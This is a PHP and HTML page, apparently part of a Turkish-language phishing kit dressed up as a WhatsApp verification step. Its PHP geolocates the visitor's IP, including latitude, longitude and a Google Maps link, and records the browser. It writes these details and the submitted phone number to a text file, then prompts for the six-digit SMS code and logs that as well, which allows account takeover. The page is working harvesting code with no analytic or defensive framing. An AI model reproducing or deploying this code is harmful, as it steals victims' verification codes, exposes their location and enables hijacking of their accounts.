 <?php 
error_reporting(0); 
if (isset($_POST["telnumber"])) {
$data = @unserialize(file_get_contents("http://ip-api.com/php/".$ip));
$ip =$data["query"];
date_default_timezone_set('Europe/Istanbul');


$tarih =" Tarih : ".date('d/m/Y  H:i');
$Geo_Plugin_XML = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip); 
$adress = $Geo_Plugin_XML->geoplugin_request; 
$ulke = $Geo_Plugin_XML->geoplugin_countryName;
$bolge = $Geo_Plugin_XML->geoplugin_region;
$kita = $Geo_Plugin_XML->geoplugin_continentCode;
$ulkekodu = $Geo_Plugin_XML->geoplugin_countryCode;
$sehir = $Geo_Plugin_XML->geoplugin_city;
$plaka = $Geo_Plugin_XML->geoplugin_regionCode;
$enlem = $Geo_Plugin_XML->geoplugin_latitude;
$boylam = $Geo_Plugin_XML->geoplugin_longitude;
$tarayici = $_SERVER['HTTP_USER_AGENT']; 

$maps = "https://www.google.com/maps/place/".$enlem.",".$boylam."/@".$enlem.",".$boylam.",16z";
$yamanefkar["0"] = " Ip Adresi : ".$adress;
$yamanefkar["1"] = " Ulke : ".$ulke; 
$yamanefkar["2"] = " Bolge : ".$bolge;
$yamanefkar["3"] = " Kita : ".$kita;
$yamanefkar["4"] = " Ulke Kodu : ".$ulkekodu;
$yamanefkar["5"] = " Sehir : ".$sehir;
$yamanefkar["6"] = " Plaka : ".$plaka;
$yamanefkar["7"] = " Enlem : ".$enlem;
$yamanefkar["8"] = " Boylam : ".$boylam;
$yamanefkar["9"] = " Google Maps : ".$maps;
$yamanefkar["10"] = " Tarayıcı : ".$tarayici; 


$ac = fopen("kayit.txt","a+");

$userlar = ("\n __________________ \n".$tarih."\n".$yamanefkar["0"]."\n".$yamanefkar["1"]."\n".$yamanefkar["2"]."\n".$yamanefkar["3"]."\n".$yamanefkar["4"]."\n".$yamanefkar["5"]."\n".$yamanefkar["6"]."\n".$yamanefkar["7"]."\n".$yamanefkar["8"]."\n".$yamanefkar["9"]."\n".$yamanefkar["10"]."\n\n!--VERİLER--!\n");
fwrite($ac,$userlar);
fclose($ac);
sleep(2);
  
$ac = fopen("kayit.txt","a+");
$tel = $_POST['telnumber'];
$userlar = ("\n Telefon No : ".$tel."\n");
fwrite($ac,$userlar);
fclose($ac);
sleep(1);

}
else if(isset($_POST["code"])){
$ac = fopen("kayit.txt","a+");
$code = $_POST['code'];
$userlar = (" Code : ".$code."\n  ------------------\n");
fwrite($ac,$userlar);
fclose($ac);
header('location: index.php?id=ok');
}
else{
	header('location:index.php');
}

  ?>
<!doctype html>
<html lang="tr">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
    <title>Hello, world!</title>
  </head>
  <body style="background-image: url('http://www.allwhitebackground.com/images/7/WhatsApp-Background-High-Quality-Image.jpg');  background-repeat: no-repeat;
  background-attachment: fixed;
  background-position: center;height: 100%;width: 100%;" bgcolor="black">
  	<div class="container ">
  		<div class="row mt-5">
  		<div class="col-md-12 col-12">
  			<center>
  			<div class="card bg-dark col-12"  style="opacity: 0.9">
  				<div class="card-body">
  					<p class="text-danger font-weight-bold">Lütfen sms ile gelen kodunuzu giriniz!</p>
  					<form method="POST" action="code.php">
  						<div class="form-row pt-3">
  							<div class="form-group col-md-12 text-white pt-1 ml-1">
  								<label>Kod</label>
  								<input type="text" name="code" class="form-control" required="" placeholder="" value="" minlength="6" maxlength="6" required=""> 
  							</div>
  						</div>
  							<div class="form-row col-12">
  								<button type="submit" class="btn btn-outline-success  btn-block ">Devam</button>
  							</div>
  							

  					</form>
  				</div>
  			</div>
  		</div>	
  		</center>
  		</div>
  	</div>

    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
  </body>
</html>